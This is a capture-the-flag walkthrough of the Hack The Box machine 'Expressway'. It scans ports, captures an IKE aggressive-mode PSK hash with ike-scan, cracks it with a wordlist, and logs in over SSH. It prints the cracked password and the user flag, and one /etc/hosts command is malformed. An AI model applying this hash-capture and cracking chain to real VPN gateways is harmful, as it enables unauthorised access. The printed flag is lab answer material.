# Expressway (Linux)

My solution pertaining to the machine **Expressway** on HTB Labs.

---

## Recon

I start by scanning all ports with a basic NMAP scan:

```
sudo nmap 10.129.8.198 -p-
```

Only port **22** appears to be open.

![Filtered output](images/nmap1.PNG)

I continue by adding service detection (**-sV**) and default scripts (**-sC**) to the NMAP command: 

```
sudo nmap 10.129.8.198 -p 22 -sV -sC
```

Port 22 is running **OpenSSH version 10.0p2** on a **Linux** OS. 

![Filtered output](images/nmap2.PNG)

I run some targeted SSH scripts with NSE:

```
sudo nmap 10.129.8.198 -p 22 --script ssh*
```

The SSH scripts did not reveal anything of importance. Since i don't have a valid username or password/SSH key, i don't think this is the intended attack vector. I could attempt brute-forcing with a tool such as **Hydra**, but brute-forcing is rarely the purpuse of HTB labs.

Most services run over TCP, but **UDP** services are still widely deployed and often exploitable. I run a new NMAP scan using UDP and include some **optimization flags** since UDP scans are much slower than TCP scans:

```
sudo nmap -p- -sU 10.129.8.198 --max-retries 0 --min-rate=3000
```

I discover an interesting service running on port **500**.

![Filtered output](images/nmap4.PNG)

After doing some research i discover that **ISAKMP** is a protocol used for IPsec-tunnels, which coincides nicely with the machine name "Expressway", hinting at a tunnel or gateway. My research also leads me to a tool called **ike-scan** used for discovering and enumerating hosts running IPsec VPN servers. 

I start by installing the tool:

```
sudo apt install ike-scan
```

I run an **ike-scan** in aggressive mode:

```
sudo ike-scan -A 10.129.8.198
```

![Filtered output](images/ike-scan1.PNG)

The scan reveals some interesting information:

- VPN login: ike@expressway.htb
- PSK hash: 20 bytes
- Encryption: 3DES/SHA1
- DH group: modp1024

By including the **--pskcrack** flag the raw PSK can be written to file and used for offline cracking with the **psk-crack** tool:

```
sudo ike-scan -A --pskcrack=ike_hash.txt 10.129.8.198
```

The next step is to attempt to crack the hash with the **psk-crack** tool. I will utilize a wordlist called **rockyou.txt**. The wordlist is available in **Gzip** format on all HTB machines. You need to decompress the file before use:

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```
psk-crack ike_hash.txt -d /usr/share/wordlists/rockyou.txt
```

![Filtered output](images/ikescan2.PNG)

The hash was succesfully cracked! 

You don't have to use **psk-crack**, you can just as well use **hashcat** or **JohnTheRipper**. To crack the hash with **hashcat** use mode 5400 (IKE-PSK SHA1).

```
hashcat -a 0 -m 5400 ike_hash.txt /usr/share/wordlists/rockyou.txt
```

![Filtered output](images/ike-scan2.PNG)

Below is a short summary of obtained information about the target:

- IP: 10.129.8.198
- ID: ike@expressway.htb
- PSK: freakingrockstarontheroad

The next step is figuring out how to utilize the information obtained in order to connect to the target. 

Let's start of with a simple SSH connection to **ike@expressway.htb**:

```
ssh ike@expressway.htb
```

![Filtered output](images/ssh-1.PNG)

It did not work because we have not added the hostname to the **/etc/hosts** file. Add the hostname and try again:

```
echo "10.129.12.184 ike@expressway.htb" >> /etc/hosts
```

```
ssh ike@expressway.htb
```

We have gained access to the system!

![Filtered output](images/ssh-2.PNG)

The first flag is located in the users home directory in a file called **user.txt**:

```
cat user.txt
6e42b743d77c11b2093c7b7d9d50be82
```

Flag:

```
6e42b743d77c11b2093c7b7d9d50be82
```

![Filtered output](images/userflag.PNG)


